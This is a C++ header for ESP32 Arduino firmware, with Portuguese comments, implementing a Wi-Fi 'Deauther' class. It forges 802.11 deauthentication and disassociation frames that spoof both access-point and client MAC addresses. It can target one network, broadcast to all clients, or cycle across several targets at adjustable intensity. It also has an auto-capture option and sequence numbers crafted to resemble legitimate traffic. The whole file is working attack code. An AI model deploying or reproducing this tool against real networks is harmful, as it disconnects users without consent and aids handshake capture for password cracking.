#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

class Deauther {
public:
    static Deauther& get() { static Deauther inst; return inst; }

    bool     running       = false;
    bool     autoCapture   = false;
    uint32_t framesSent    = 0;
    uint8_t  intensity     = 1;  // 0=suave, 1=normal, 2=agressivo

    // Alvo principal (single mode)
    uint8_t targetAP[6]     = {0};
    uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t channel         = 1;
    bool    broadcastMode   = true;

    // Multi-target mode
    struct Target {
        uint8_t ap[6];
        uint8_t client[6];
        uint8_t channel;
    };
    std::vector<Target> multiTargets;
    bool multiMode = false;

    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false) {
        memcpy(targetAP, ap, 6);
        if (client) memcpy(targetClient, client, 6);
        else        memset(targetClient, 0xFF, 6);
        channel       = ch;
        broadcastMode = (memcmp(client, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0);
        autoCapture   = autoC;
        framesSent    = 0;
        multiMode     = false;
        running       = true;
        LOG.warn("[DEAUTH] " + bssidStr(ap) +
                 (broadcastMode ? " -> BROADCAST" : " -> " + bssidStr(client)) +
                 " ch" + String(ch) + (autoC ? " [AUTO-CAPTURE]" : ""));
    }

    void startMulti(const std::vector<Target>& targets) {
        multiTargets = targets;
        multiMode    = true;
        framesSent   = 0;
        running      = true;
        LOG.warn("[DEAUTH MULTI] " + String(targets.size()) + " alvos simultâneos");
    }

    void addMultiTarget(const uint8_t* ap, const uint8_t* client, uint8_t ch) {
        Target t;
        memcpy(t.ap, ap, 6);
        memcpy(t.client, client, 6);
        t.channel = ch;
        multiTargets.push_back(t);
    }

    void stop() {
        running     = false;
        autoCapture = false;
        multiMode   = false;
        multiTargets.clear();
        LOG.info("[DEAUTH] Parado. Frames enviados: " + String(framesSent));
    }

    void tick() {
        if (!running) return;
        if (multiMode) _tickMulti();
        else           _tickSingle();
    }

    static String bssidStr(const uint8_t* b) {
        char buf[18];
        snprintf(buf,18,"%02X:%02X:%02X:%02X:%02X:%02X",b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }

private:
    static const uint8_t _reasons[];

    int _burstSize() const {
        if (intensity == 0) return DEAUTH_BURST_SOFT;
        if (intensity == 2) return DEAUTH_BURST_HARD;
        return DEAUTH_BURST;
    }

    void _tickSingle() {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        int burst = _burstSize();
        for (int i = 0; i < burst; i++) {
            _sendFrame(targetAP, targetClient, _reasons[i % 8], 0xC0, i);
            _sendFrame(targetAP, targetClient, 0x08, 0xA0, i);
            framesSent += 2;
        }
    }

    void _tickMulti() {
        static size_t idx = 0;
        if (multiTargets.empty()) return;
        const Target& t = multiTargets[idx % multiTargets.size()];
        esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
        int burst = max(4, _burstSize() / (int)multiTargets.size());
        for (int i = 0; i < burst; i++) {
            _sendFrame(t.ap, t.client, _reasons[i % 8], 0xC0, i);
            _sendFrame(t.ap, t.client, 0x08, 0xA0, i);
            framesSent += 2;
        }
        idx++;
    }

    void _sendFrame(const uint8_t* ap, const uint8_t* client, uint8_t reason, uint8_t fc0, int seq = 0) {
        uint8_t f[26] = {};
        f[0] = fc0; f[1] = 0x00;
        // Sequence control: incrementa para parecer tráfego legítimo
        f[22] = (uint8_t)((seq & 0x0F) << 4);
        f[23] = (uint8_t)(seq >> 4);
        f[24] = reason;
        // AP → Client
        memcpy(f + 4,  client, 6);
        memcpy(f + 10, ap, 6);
        memcpy(f + 16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
        // Client → AP
        memcpy(f + 4,  ap, 6);
        memcpy(f + 10, client, 6);
        memcpy(f + 16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
    }
};

inline const uint8_t Deauther::_reasons[] = {
    0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x09, 0x0E
};
